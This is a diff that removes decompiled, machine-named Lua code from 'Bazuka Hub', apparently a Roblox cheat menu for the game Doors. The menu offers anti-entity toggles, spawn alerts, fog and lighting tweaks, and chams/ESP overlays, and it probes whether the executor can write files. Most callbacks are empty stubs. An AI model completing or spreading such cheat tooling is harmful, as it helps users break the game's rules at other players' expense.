-    local _2436 = game.Players.LocalPlayer
-    local _2437 = _2436.DisplayName
-    local _2438 = _2435("Bazuka Hub", _2437, "Bazuka Hub")
-    local _2439 = _2438.Category
-    local _2440 = _2439(_2438, "Info", "http://www.roblox.com/asset/?id=12707252279")
-    local _2441 = _2438.Category
-    local _2442 = _2441(_2438, "Misc", "http://www.roblox.com/asset/?id=97163436981193")
-    local _2443 = _2438.Category
-    local _2444 = _2443(_2438, "Visual", "http://www.roblox.com/asset/?id=13321848320")
-    local _2445 = _2438.Category
-    local _2446 = _2445(_2438, "Character", "http://www.roblox.com/asset/?id=8395621517")
-    local _2447 = _2438.Category
-    _2447(_2438, "Other", "http://www.roblox.com/asset/?id=11932591062")
-    local _2449 = Color3.fromRGB
-    _2449(255, 255, 255)
-    local _2451 = Color3.fromRGB
-    _2451(0, 0, 0)
-    local _2453 = Color3.fromRGB
-    _2453(160, 160, 160)
-    local _2455 = Color3.fromRGB
-    _2455(0, 0, 0)
-    local _2457 = Color3.fromRGB
-    local _2458 = _2457(255, 255, 255)
-    local _ = game.Lighting.FogColor
-    local _2460 = Color3.fromRGB
-    local _2461 = _2460(255, 255, 255)
-    local _ = game.Lighting.FogEnd
-    local _ = game.Lighting.FogStart
-    local _2464 = Color3.fromRGB
-    local _2465 = _2464(255, 255, 255)
-    local _2466 = Color3.fromRGB
-    local _2467 = _2466(255, 255, 255)
-    local _2468 = Color3.fromRGB
-    local _2469 = _2468(255, 255, 255)
-    local _2470 = Color3.fromRGB
-    local _2471 = _2470(255, 255, 255)
-    local _2472 = Color3.fromRGB
-    local _2473 = _2472(255, 255, 255)
-    local _2474 = Color3.fromRGB
-    local _2475 = _2474(255, 255, 255)
-    local _2476 = Color3.fromRGB
-    local _2477 = _2476(255, 255, 255)
-    local _2478 = Color3.fromRGB
-    local _2479 = _2478(255, 255, 255)
-    local _2480 = Color3.fromRGB
-    local _2481 = _2480(255, 255, 255)
-    local _2482 = Color3.fromRGB
-    local _2483 = _2482(255, 255, 255)
-    local _2484 = Color3.fromRGB
-    local _2485 = _2484(255, 255, 255)
-    local _2486 = Color3.fromRGB
-    local _2487 = _2486(255, 255, 255)
-    local _2488 = Color3.fromRGB
-    local _2489 = _2488(255, 255, 255)
-    local _2490 = Color3.fromRGB
-    local _2491 = _2490(255, 255, 255)
-    local _2492 = Color3.fromRGB
-    local _2493 = _2492(255, 255, 255)
-    local _2494 = Color3.fromRGB
-    local _2495 = _2494(255, 255, 255)
-    local _2496 = Color3.fromRGB
-    local _2497 = _2496(255, 255, 255)
-    local _2498 = Color3.fromRGB
-    local _2499 = _2498(255, 255, 255)
-    local _2500 = Color3.fromRGB
-    local _2501 = _2500(255, 255, 255)
-    local _2502 = Color3.fromRGB
-    local _2503 = _2502(255, 255, 255)
-    local _2504 = Color3.fromRGB
-    local _2505 = _2504(255, 255, 255)
-    local _2506 = Color3.fromRGB
-    local _2507 = _2506(255, 255, 255)
-    local _2508 = Color3.fromRGB
-    local _2509 = _2508(255, 255, 255)
-    local _2510 = Color3.fromRGB
-    local _2511 = _2510(255, 255, 255)
-    local _2512 = Color3.fromRGB
-    local _2513 = _2512(255, 255, 255)
-    local _2514 = Color3.fromRGB
-    local _2515 = _2514(255, 255, 255)
-    local _2516 = Color3.fromRGB
-    local _2517 = _2516(255, 255, 255)
-    local _2518 = Color3.fromRGB
-    local _2519 = _2518(255, 255, 255)
-    local _2520 = Color3.fromRGB
-    local _2521 = _2520(255, 255, 255)
-    local _2522 = Color3.fromRGB
-    local _2523 = _2522(255, 255, 255)
-    local _2524 = Color3.fromRGB
-    local _2525 = _2524(255, 255, 255)
-    local _2526 = Color3.fromRGB
-    local _2527 = _2526(255, 255, 255)
-    local _2528 = Color3.fromRGB
-    local _2529 = _2528(255, 255, 255)
-    local _2530 = Color3.fromRGB
-    local _2531 = _2530(255, 255, 255)
-    local _2532 = Color3.fromRGB
-    local _2533 = _2532(255, 255, 255)
-    local _2534 = Color3.fromRGB
-    local _2535 = _2534(255, 255, 255)
-    local _2536 = Color3.fromRGB
-    local _2537 = _2536(255, 255, 255)
-    local _2538 = Color3.fromRGB
-    local _2539 = _2538(255, 255, 255)
-    local _2540 = Color3.fromRGB
-    local _2541 = _2540(255, 255, 255)
-    local _2542 = Color3.fromRGB
-    local _2543 = _2542(255, 255, 255)
-    local _2544 = Color3.fromRGB
-    local _2545 = _2544(255, 255, 255)
-    local _2546 = Color3.fromRGB
-    local _2547 = _2546(255, 255, 255)
-    local _2548 = Color3.fromRGB
-    local _2549 = _2548(255, 255, 255)
-    local _2550 = Color3.fromRGB
-    local _2551 = _2550(255, 255, 255)
-    local _2552 = Color3.fromRGB
-    local _2553 = _2552(255, 255, 255)
-    local _2554 = Color3.fromRGB
-    local _2555 = _2554(255, 255, 255)
-    local _2556 = Color3.fromRGB
-    local _2557 = _2556(255, 255, 255)
-    local _2558 = Color3.fromRGB
-    local _2559 = _2558(255, 255, 255)
-    local _2560 = Color3.fromRGB
-    local _2561 = _2560(255, 255, 255)
-    local _2562 = Color3.fromRGB
-    local _2563 = _2562(255, 255, 255)
-    local _2564 = Color3.fromRGB
-    local _2565 = _2564(255, 255, 255)
-    local _2566 = Color3.fromRGB
-    local _2567 = _2566(255, 255, 255)
-    local _2568 = Color3.fromRGB
-    local _2569 = _2568(255, 255, 255)
-    local _2570 = Color3.fromRGB
-    local _2571 = _2570(255, 255, 255)
-    task.spawn(function(_2573, _2573_2, _2573_3)
-        writefile(".tests/readfile.txt", "success")
-    end)
-    task.spawn(function(_2576, _2576_2, _2576_3)
-    end)
-    task.spawn(function(_2578, _2578_2, _2578_3)
-        writefile(".tests/writefile.txt", "success")
-    end)
-    task.spawn(function(_2581, _2581_2, _2581_3)
-        writefile(".tests/appendfile.txt", "su")
-    end)
-    local _2582 = _2438.Notification
-    _2582(_2438, {
-        expire = 3,
-        Title = "Bazuka Hub",
-        Desc = "Your executor doesnt support config system!",
-    })
-    local _2584 = _2440.Button
-    local _2585 = _2584(_2440, "Information", "http://www.roblox.com/asset/?id=12707252279")
-    local _2586 = _2585.Section
-    local _2587 = _2586(_2585, "GUI was made by Bazuka_ofcx", "Left")
-    local _2588 = _2587.Button
-    _2588(_2587, {
-        ButtonName = "Copy Link",
-        Title = "GUI Library",
-        Description = "Modified Bazuka Hub",
-    }, function(_2590, _2590_2, _2590_3)
-        error("line 1: attempt to call a nil value")
-    end)
-    local _2591 = _2587.Button
-    _2591(_2587, {
-        ButtonName = "Copy Link",
-        Title = "Discord link",
-        Description = "Our Discord Server",
-    }, function(_2593, _2593_2, _2593_3)
-        error("line 1: attempt to call a nil value")
-    end)
-    local _2594 = _2585.Section
-    _2594(_2585, "Information:", "Left")
-    local _2596 = _2585.Section
-    _2596(_2585, "Last Update Changelog:", "Right")
-    local _2598 = _2442.Button
-    local _2599 = _2598(_2442, "Misc Features", "http://www.roblox.com/asset/?id=97163436981193")
-    local _2600 = _2599.Section
-    local _2601 = _2600(_2599, "Entity protection", "Left")
-    local _2602 = _2601.Toggle
-    _2602(_2601, {
-        Default = false,
-        Description = "You can't be Stunned",
-        Title = "Anti Stun",
-    }, function(_2604, _2604_2, _2604_3)
-    end)
-    local _2605 = _2601.Toggle
-    _2605(_2601, {
-        Default = false,
-        Description = "You can't be Trapped by Snare",
-        Title = "Anti Snare",
-    }, function(_2607, _2607_2, _2607_3)
-    end)
-    local _2608 = _2601.Toggle
-    _2608(_2601, {
-        Default = false,
-        Description = "Figure Can't Hear You",
-        Title = "Anti Hearing",
-    }, function(_2610, _2610_2, _2610_3)
-    end)
-    local _2611 = _2601.Toggle
-    _2611(_2601, {
-        Default = false,
-        Description = "Eyes Can't Hurt You",
-        Title = "Anti Eyes",
-    }, function(_2613, _2613_2, _2613_3)
-    end)
-    local _2614 = _2601.Toggle
-    _2614(_2601, {
-        Default = false,
-        Description = "Screech won't spawn",
-        Title = "Anti Screech",
-    }, function(_2616, _2616_2, _2616_3)
-    end)
-    local _2617 = _2601.Toggle
-    _2617(_2601, {
-        Default = false,
-        Description = "Seek Obstructions won't spawn",
-        Title = "No Obstruct",
-    }, function(_2619, _2619_2, _2619_3)
-    end)
-    local _2620 = _2599.Section
-    local _2621 = _2620(_2599, "Other Game Functions", "Right")
-    local _2622 = _2621.Toggle
-    _2622(_2621, {
-        Default = false,
-        Description = "Instantly Prompting",
-        Title = "Instant Prompt",
-    }, function(_2624, _2624_2, _2624_3)
-    end)
-    local _2625 = _2621.Slider
-    _2625(_2621, {
-        Min = 1,
-        Title = "Render Delay",
-        Max = 200,
-        Default = 50,
-        Description = "",
-    }, function(_2627, _2627_2, _2627_3)
-        local _2628, _2628_2, _2628_3 = math.floor(_2627)
-        local _ = _2628 / 100
-    end)
-    local _2630 = _2442.Button
-    local _2631 = _2630(_2442, "Spawn Notification", "http://www.roblox.com/asset/?id=11401835376")
-    local _2632 = _2631.Section
-    local _2633 = _2632(_2631, "Spawn Notifications", "Left")
-    local _2634 = _2633.Toggle
-    _2634(_2633, {
-        Default = false,
-        Description = "Notify You When Eyes Spawn",
-        Title = "Eyes Spawn",
-    }, function(_2636, _2636_2, _2636_3)
-    end)
-    local _2637 = _2633.Toggle
-    _2637(_2633, {
-        Default = false,
-        Description = "Notify You When Rush Spawn",
-        Title = "Rush Spawn",
-    }, function(_2639, _2639_2, _2639_3)
-    end)
-    local _2640 = _2633.Toggle
-    _2640(_2633, {
-        Default = false,
-        Description = "Notify You When Ambush Spawn",
-        Title = "Ambush Spawn",
-    }, function(_2642, _2642_2, _2642_3)
-    end)
-    local _2643 = _2444.Button
-    local _2644 = _2643(_2444, "World", "http://www.roblox.com/asset/?id=11887653877")
-    local _2645 = _2644.Section
-    local _2646 = _2645(_2644, "Custom Fog", "Left")
-    local _2647 = _2646.Toggle
-    _2647(_2646, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_2649, _2649_2, _2649_3)
-    end)
-    local _2650 = _2646.Slider
-    _2650(_2646, {
-        Min = 0,
-        Title = "Fog End",
-        Max = 5000,
-        Default = 1000,
-        Description = "",
-    }, function(_2652, _2652_2, _2652_3)
-        math.floor(_2652)
-    end)
-    local _2654 = _2646.Slider
-    _2654(_2646, {
-        Min = 0,
-        Title = "Fog Start",
-        Max = 2000,
-        Default = 100,
-        Description = "",
-    }, function(_2656, _2656_2, _2656_3)
-        math.floor(_2656)
-    end)
-    type(_2461)
-    local _ = _2461.r
-    local _ = _2461.g
-    local _ = _2461.b
-    local _2662 = _2646.ColorPicker
-    local _2663 = Color3.new
-    local _2664 = _2663()
-    _2662(_2646, {
-        Default = _2664,
-        Description = "",
-        Title = "Fog Color",
-    }, function(_2666, _2666_2, _2666_3)
-    end)
-    local _2667 = _2644.Section
-    local _2668 = _2667(_2644, "Light Around Player", "Right")
-    local _2669 = _2668.Toggle
-    _2669(_2668, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_2671, _2671_2, _2671_3)
-    end)
-    local _2672 = _2668.Toggle
-    _2672(_2668, {
-        Default = false,
-        Description = "",
-        Title = "Shadows",
-    }, function(_2674, _2674_2, _2674_3)
-    end)
-    local _2675 = _2668.Slider
-    _2675(_2668, {
-        Min = 0,
-        Title = "Range",
-        Max = 60,
-        Default = 60,
-        Description = "",
-    }, function(_2677, _2677_2, _2677_3)
-        math.floor(_2677)
-    end)
-    local _2679 = _2668.Slider
-    _2679(_2668, {
-        Min = 0,
-        Title = "Brightness",
-        Max = 100,
-        Default = 10,
-        Description = "",
-    }, function(_2681, _2681_2, _2681_3)
-        local _2682 = _2681 / 10
-        math.floor(_2682)
-    end)
-    type(_2458)
-    local _ = _2458.r
-    local _ = _2458.g
-    local _ = _2458.b
-    local _2688 = _2668.ColorPicker
-    local _2689 = Color3.new
-    local _2690 = _2689()
-    _2688(_2668, {
-        Default = _2690,
-        Description = "",
-        Title = "Color",
-    }, function(_2692, _2692_2, _2692_3)
-    end)
-    local _2693 = _2444.Button
-    local _2694 = _2693(_2444, "Room Chams & ESP", "http://www.roblox.com/asset/?id=13200016780")
-    local _2695 = _2694.Section
-    local _2696 = _2695(_2694, "Real Door Chams", "Left")
-    local _2697 = _2696.Toggle
-    _2697(_2696, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_2699, _2699_2, _2699_3)
-    end)
-    local _2700 = _2696.Slider
-    _2700(_2696, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_2702, _2702_2, _2702_3)
-        local _2703, _2703_2, _2703_3 = math.floor(_2702)
-        local _ = _2703 / 100
-    end)
-    type(_2469)
-    local _ = _2469.r
-    local _ = _2469.g
-    local _ = _2469.b
-    local _2709 = _2696.ColorPicker
-    local _2710 = Color3.new
-    local _2711 = _2710()
-    _2709(_2696, {
-        Default = _2711,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_2713, _2713_2, _2713_3)
-    end)
-    local _2714 = _2696.Slider
-    _2714(_2696, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_2716, _2716_2, _2716_3)
-        local _2717, _2717_2, _2717_3 = math.floor(_2716)
-        local _ = _2717 / 100
-    end)
-    type(_2471)
-    local _ = _2471.r
-    local _ = _2471.g
-    local _ = _2471.b
-    local _2723 = _2696.ColorPicker
-    local _2724 = Color3.new
-    local _2725 = _2724()
-    _2723(_2696, {
-        Default = _2725,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_2727, _2727_2, _2727_3)
-    end)
-    local _2728 = _2694.Section
-    local _2729 = _2728(_2694, "Real Door ESP", "Right")
-    local _2730 = _2729.Toggle
-    _2730(_2729, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_2732, _2732_2, _2732_3)
-    end)
-    local _2733 = _2729.Slider
-    _2733(_2729, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_2735, _2735_2, _2735_3)
-        local _2736, _2736_2, _2736_3 = math.floor(_2735)
-        local _ = _2736 / 100
-    end)
-    local _2738 = _2729.Toggle
-    _2738(_2729, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_2740, _2740_2, _2740_3)
-    end)
-    local _2741 = _2729.Toggle
-    _2741(_2729, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_2743, _2743_2, _2743_3)
-    end)
-    local _2744 = _2729.Toggle
-    _2744(_2729, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_2746, _2746_2, _2746_3)
-    end)
-    local _2747 = _2729.Slider
-    _2747(_2729, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_2749, _2749_2, _2749_3)
-        math.floor(_2749)
-    end)
-    type(_2545)
-    local _ = _2545.r
-    local _ = _2545.g
-    local _ = _2545.b
-    local _2755 = _2729.ColorPicker
-    local _2756 = Color3.new
-    local _2757 = _2756()
-    _2755(_2729, {
-        Default = _2757,
-        Description = "",
-        Title = "Text Color",
-    }, function(_2759, _2759_2, _2759_3)
-    end)
-    local _2760 = _2694.Section
-    local _2761 = _2760(_2694, "Fake Door Chams", "Left")
-    local _2762 = _2761.Toggle
-    _2762(_2761, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_2764, _2764_2, _2764_3)
-    end)
-    local _2765 = _2761.Slider
-    _2765(_2761, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_2767, _2767_2, _2767_3)
-        local _2768, _2768_2, _2768_3 = math.floor(_2767)
-        local _ = _2768 / 100
-    end)
-    type(_2465)
-    local _ = _2465.r
-    local _ = _2465.g
-    local _ = _2465.b
-    local _2774 = _2761.ColorPicker
-    local _2775 = Color3.new
-    local _2776 = _2775()
-    _2774(_2761, {
-        Default = _2776,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_2778, _2778_2, _2778_3)
-    end)
-    local _2779 = _2761.Slider
-    _2779(_2761, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_2781, _2781_2, _2781_3)
-        local _2782, _2782_2, _2782_3 = math.floor(_2781)
-        local _ = _2782 / 100
-    end)
-    type(_2467)
-    local _ = _2467.r
-    local _ = _2467.g
-    local _ = _2467.b
-    local _2788 = _2761.ColorPicker
-    local _2789 = Color3.new
-    local _2790 = _2789()
-    _2788(_2761, {
-        Default = _2790,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_2792, _2792_2, _2792_3)
-    end)
-    local _2793 = _2694.Section
-    local _2794 = _2793(_2694, "Fake Door ESP", "Right")
-    local _2795 = _2794.Toggle
-    _2795(_2794, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_2797, _2797_2, _2797_3)
-    end)
-    local _2798 = _2794.Slider
-    _2798(_2794, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_2800, _2800_2, _2800_3)
-        local _2801, _2801_2, _2801_3 = math.floor(_2800)
-        local _ = _2801 / 100
-    end)
-    local _2803 = _2794.Toggle
-    _2803(_2794, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_2805, _2805_2, _2805_3)
-    end)
-    local _2806 = _2794.Toggle
-    _2806(_2794, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_2808, _2808_2, _2808_3)
-    end)
-    local _2809 = _2794.Toggle
-    _2809(_2794, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_2811, _2811_2, _2811_3)
-    end)
-    local _2812 = _2794.Slider
-    _2812(_2794, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_2814, _2814_2, _2814_3)
-        math.floor(_2814)
-    end)
-    type(_2547)
-    local _ = _2547.r
-    local _ = _2547.g
-    local _ = _2547.b
-    local _2820 = _2794.ColorPicker
-    local _2821 = Color3.new
-    local _2822 = _2821()
-    _2820(_2794, {
-        Default = _2822,
-        Description = "",
-        Title = "Text Color",
-    }, function(_2824, _2824_2, _2824_3)
-    end)
-    local _2825 = _2694.Section
-    local _2826 = _2825(_2694, "Lever Chams", "Left")
-    local _2827 = _2826.Toggle
-    _2827(_2826, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_2829, _2829_2, _2829_3)
-    end)
-    local _2830 = _2826.Slider
-    _2830(_2826, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_2832, _2832_2, _2832_3)
-        local _2833, _2833_2, _2833_3 = math.floor(_2832)
-        local _ = _2833 / 100
-    end)
-    type(_2473)
-    local _ = _2473.r
-    local _ = _2473.g
-    local _ = _2473.b
-    local _2839 = _2826.ColorPicker
-    local _2840 = Color3.new
-    local _2841 = _2840()
-    _2839(_2826, {
-        Default = _2841,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_2843, _2843_2, _2843_3)
-    end)
-    local _2844 = _2826.Slider
-    _2844(_2826, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_2846, _2846_2, _2846_3)
-        local _2847, _2847_2, _2847_3 = math.floor(_2846)
-        local _ = _2847 / 100
-    end)
-    type(_2475)
-    local _ = _2475.r
-    local _ = _2475.g
-    local _ = _2475.b
-    local _2853 = _2826.ColorPicker
-    local _2854 = Color3.new
-    local _2855 = _2854()
-    _2853(_2826, {
-        Default = _2855,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_2857, _2857_2, _2857_3)
-    end)
-    local _2858 = _2694.Section
-    local _2859 = _2858(_2694, "Lever ESP", "Right")
-    local _2860 = _2859.Toggle
-    _2860(_2859, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_2862, _2862_2, _2862_3)
-    end)
-    local _2863 = _2859.Slider
-    _2863(_2859, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_2865, _2865_2, _2865_3)
-        local _2866, _2866_2, _2866_3 = math.floor(_2865)
-        local _ = _2866 / 100
-    end)
-    local _2868 = _2859.Toggle
-    _2868(_2859, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_2870, _2870_2, _2870_3)
-    end)
-    local _2871 = _2859.Toggle
-    _2871(_2859, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_2873, _2873_2, _2873_3)
-    end)
-    local _2874 = _2859.Toggle
-    _2874(_2859, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_2876, _2876_2, _2876_3)
-    end)
-    local _2877 = _2859.Slider
-    _2877(_2859, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_2879, _2879_2, _2879_3)
-        math.floor(_2879)
-    end)
-    type(_2549)
-    local _ = _2549.r
-    local _ = _2549.g
-    local _ = _2549.b
-    local _2885 = _2859.ColorPicker
-    local _2886 = Color3.new
-    local _2887 = _2886()
-    _2885(_2859, {
-        Default = _2887,
-        Description = "",
-        Title = "Text Color",
-    }, function(_2889, _2889_2, _2889_3)
-    end)
-    local _2890 = _2694.Section
-    local _2891 = _2890(_2694, "Snare Chams", "Left")
-    local _2892 = _2891.Toggle
-    _2892(_2891, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_2894, _2894_2, _2894_3)
-    end)
-    local _2895 = _2891.Slider
-    _2895(_2891, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_2897, _2897_2, _2897_3)
-        local _2898, _2898_2, _2898_3 = math.floor(_2897)
-        local _ = _2898 / 100
-    end)
-    type(_2477)
-    local _ = _2477.r
-    local _ = _2477.g
-    local _ = _2477.b
-    local _2904 = _2891.ColorPicker
-    local _2905 = Color3.new
-    local _2906 = _2905()
-    _2904(_2891, {
-        Default = _2906,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_2908, _2908_2, _2908_3)
-    end)
-    local _2909 = _2891.Slider
-    _2909(_2891, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_2911, _2911_2, _2911_3)
-        local _2912, _2912_2, _2912_3 = math.floor(_2911)
-        local _ = _2912 / 100
-    end)
-    type(_2479)
-    local _ = _2479.r
-    local _ = _2479.g
-    local _ = _2479.b
-    local _2918 = _2891.ColorPicker
-    local _2919 = Color3.new
-    local _2920 = _2919()
-    _2918(_2891, {
-        Default = _2920,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_2922, _2922_2, _2922_3)
-    end)
-    local _2923 = _2694.Section
-    local _2924 = _2923(_2694, "Snare ESP", "Right")
-    local _2925 = _2924.Toggle
-    _2925(_2924, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_2927, _2927_2, _2927_3)
-    end)
-    local _2928 = _2924.Slider
-    _2928(_2924, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_2930, _2930_2, _2930_3)
-        local _2931, _2931_2, _2931_3 = math.floor(_2930)
-        local _ = _2931 / 100
-    end)
-    local _2933 = _2924.Toggle
-    _2933(_2924, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_2935, _2935_2, _2935_3)
-    end)
-    local _2936 = _2924.Toggle
-    _2936(_2924, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_2938, _2938_2, _2938_3)
-    end)
-    local _2939 = _2924.Toggle
-    _2939(_2924, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_2941, _2941_2, _2941_3)
-    end)
-    local _2942 = _2924.Slider
-    _2942(_2924, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_2944, _2944_2, _2944_3)
-        math.floor(_2944)
-    end)
-    type(_2551)
-    local _ = _2551.r
-    local _ = _2551.g
-    local _ = _2551.b
-    local _2950 = _2924.ColorPicker
-    local _2951 = Color3.new
-    local _2952 = _2951()
-    _2950(_2924, {
-        Default = _2952,
-        Description = "",
-        Title = "Text Color",
-    }, function(_2954, _2954_2, _2954_3)
-    end)
-    local _2955 = _2444.Button
-    local _2956 = _2955(_2444, "Entity Chams & ESP", "http://www.roblox.com/asset/?id=120937713530381")
-    local _2957 = _2956.Section
-    local _2958 = _2957(_2956, "Rush Chams", "Left")
-    local _2959 = _2958.Toggle
-    _2959(_2958, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_2961, _2961_2, _2961_3)
-    end)
-    local _2962 = _2958.Slider
-    _2962(_2958, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_2964, _2964_2, _2964_3)
-        local _2965, _2965_2, _2965_3 = math.floor(_2964)
-        local _ = _2965 / 100
-    end)
-    type(_2481)
-    local _ = _2481.r
-    local _ = _2481.g
-    local _ = _2481.b
-    local _2971 = _2958.ColorPicker
-    local _2972 = Color3.new
-    local _2973 = _2972()
-    _2971(_2958, {
-        Default = _2973,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_2975, _2975_2, _2975_3)
-    end)
-    local _2976 = _2958.Slider
-    _2976(_2958, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_2978, _2978_2, _2978_3)
-        local _2979, _2979_2, _2979_3 = math.floor(_2978)
-        local _ = _2979 / 100
-    end)
-    type(_2483)
-    local _ = _2483.r
-    local _ = _2483.g
-    local _ = _2483.b
-    local _2985 = _2958.ColorPicker
-    local _2986 = Color3.new
-    local _2987 = _2986()
-    _2985(_2958, {
-        Default = _2987,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_2989, _2989_2, _2989_3)
-    end)
-    local _2990 = _2956.Section
-    local _2991 = _2990(_2956, "Rush ESP", "Right")
-    local _2992 = _2991.Toggle
-    _2992(_2991, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_2994, _2994_2, _2994_3)
-    end)
-    local _2995 = _2991.Slider
-    _2995(_2991, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_2997, _2997_2, _2997_3)
-        local _2998, _2998_2, _2998_3 = math.floor(_2997)
-        local _ = _2998 / 100
-    end)
-    local _3000 = _2991.Toggle
-    _3000(_2991, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_3002, _3002_2, _3002_3)
-    end)
-    local _3003 = _2991.Toggle
-    _3003(_2991, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_3005, _3005_2, _3005_3)
-    end)
-    local _3006 = _2991.Toggle
-    _3006(_2991, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_3008, _3008_2, _3008_3)
-    end)
-    local _3009 = _2991.Slider
-    _3009(_2991, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_3011, _3011_2, _3011_3)
-        math.floor(_3011)
-    end)
-    type(_2537)
-    local _ = _2537.r
-    local _ = _2537.g
-    local _ = _2537.b
-    local _3017 = _2991.ColorPicker
-    local _3018 = Color3.new
-    local _3019 = _3018()
-    _3017(_2991, {
-        Default = _3019,
-        Description = "",
-        Title = "Text Color",
-    }, function(_3021, _3021_2, _3021_3)
-    end)
-    local _3022 = _2956.Section
-    local _3023 = _3022(_2956, "Ambush Chams", "Left")
-    local _3024 = _3023.Toggle
-    _3024(_3023, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3026, _3026_2, _3026_3)
-    end)
-    local _3027 = _3023.Slider
-    _3027(_3023, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_3029, _3029_2, _3029_3)
-        local _3030, _3030_2, _3030_3 = math.floor(_3029)
-        local _ = _3030 / 100
-    end)
-    type(_2485)
-    local _ = _2485.r
-    local _ = _2485.g
-    local _ = _2485.b
-    local _3036 = _3023.ColorPicker
-    local _3037 = Color3.new
-    local _3038 = _3037()
-    _3036(_3023, {
-        Default = _3038,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_3040, _3040_2, _3040_3)
-    end)
-    local _3041 = _3023.Slider
-    _3041(_3023, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_3043, _3043_2, _3043_3)
-        local _3044, _3044_2, _3044_3 = math.floor(_3043)
-        local _ = _3044 / 100
-    end)
-    type(_2487)
-    local _ = _2487.r
-    local _ = _2487.g
-    local _ = _2487.b
-    local _3050 = _3023.ColorPicker
-    local _3051 = Color3.new
-    local _3052 = _3051()
-    _3050(_3023, {
-        Default = _3052,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_3054, _3054_2, _3054_3)
-    end)
-    local _3055 = _2956.Section
-    local _3056 = _3055(_2956, "Ambush ESP", "Right")
-    local _3057 = _3056.Toggle
-    _3057(_3056, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3059, _3059_2, _3059_3)
-    end)
-    local _3060 = _3056.Slider
-    _3060(_3056, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_3062, _3062_2, _3062_3)
-        local _3063, _3063_2, _3063_3 = math.floor(_3062)
-        local _ = _3063 / 100
-    end)
